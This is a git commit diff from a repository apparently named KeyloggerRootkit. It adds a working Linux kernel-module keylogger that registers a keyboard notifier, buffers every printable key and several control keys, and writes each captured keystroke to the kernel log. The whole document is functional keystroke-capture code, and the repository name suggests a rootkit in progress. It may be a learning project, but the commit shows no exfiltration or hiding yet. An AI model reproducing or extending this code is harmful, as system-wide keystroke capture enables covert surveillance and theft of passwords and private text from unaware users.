ed7948edbd0d77a30c8d36220764d969ae40f72d
wuyuanpei <1901188454@qq.com>
2021-11-06 17:30:20 -0400

    print keylogger

---
+++ .keylogger.ko.cmd
@@ -0,0 +1,1 @@
+cmd_/home/richardwu/Desktop/KeyloggerRootkit/keylogger.ko := ld -r -m elf_x86_64  -z max-page-size=0x200000  --build-id  -T ./scripts/module-common.lds -o /home/richardwu/Desktop/KeyloggerRootkit/keylogger.ko /home/richardwu/Desktop/KeyloggerRootkit/keylogger.o /home/richardwu/Desktop/KeyloggerRootkit/keylogger.mod.o;  true
--- keylogger.c
+++ keylogger.c
@@ -1,19 +1,119 @@
 /* keylogger.c */
 
+// for kernel module
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+
+// for memset
+#include <linux/string.h>
+
+// for keyboard and notification chain
+#include <linux/notifier.h>
+#include <linux/keyboard.h>
+
+#define DEBUG 0
+#define debug(args...) if(DEBUG) printk(KERN_INFO args)
+
+#define BUF_SIZE 256
+
+static char key_buf[BUF_SIZE];
+static unsigned int key_buf_len;
+
+/* we only record ASCII characters and backspace, enter, tab, esc
+ * return 1 if record the c */
+int record_key(char c) {
+    // ASCII
+    if(c >= 0x20 && c < 0x7f) {
+        key_buf[key_buf_len] = c;
+        return 1;
+    }
+    // return 
+    else if(c == 0x01) {
+        key_buf[key_buf_len] = '\n';
+        return 1;
+    }
+    // del
+    else if(c == 0x7f) {
+        key_buf[key_buf_len] = '\b';
+        return 1;
+    }
+    // tab
+    else if(c == 0x09) {
+        key_buf[key_buf_len] = '\t';
+        return 1;
+    }
+    // esc
+    else if(c == 0x1b) {
+        key_buf[key_buf_len] = '\e';
+        return 1;
+    }
+    // do nothing
+    else {
+        return 0;
+    }
+}
+
+/* print the latest recorded character*/
+void print_key(void) {
+    char c = key_buf[key_buf_len];
+    // ASCII
+    if(c >= 0x20 && c < 0x7f)
+        printk(KERN_INFO "%c(0x%x)\n", c, c);
+    // Non ASCII
+    else
+        printk(KERN_INFO ".(0x%x)\n", c);
+}
+
+
+/* notifier callback function */
+int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
+    
+    struct keyboard_notifier_param *param = data;
+
+    if(action == KBD_KEYSYM && param->down) {
+        
+        debug("cb: down:%d; shift:%d; value:%x; ledstate:%d; action:%lx\n",
+        param->down,
+        param->shift,
+        param->value,
+        param->ledstate,
+        action);
+
+        if(record_key((char)param->value)) {
+            print_key();
+            key_buf_len++;
+        }
+
+        // loop back
+        if(key_buf_len >= BUF_SIZE) {
+            key_buf_len = 0;
+        }
+
+    }
+
+    return NOTIFY_OK;
+}
+
+/* notifier block in the notification chain*/
+static struct notifier_block nb = {
+    .notifier_call = keylogger_cb,
+};
 
 /* init function */
 static int keylogger_init(void)
 {
     printk(KERN_INFO "Keylogger is loaded!\n");
+    memset(key_buf, 0, BUF_SIZE);
+    key_buf_len = 0;
+    register_keyboard_notifier(&nb);
     return 0;
 }
 
 /* exit function */
 static void keylogger_exit(void)
 {
+    unregister_keyboard_notifier(&nb);
     printk(KERN_INFO "Keylogger is unloaded!\n");
 }
 
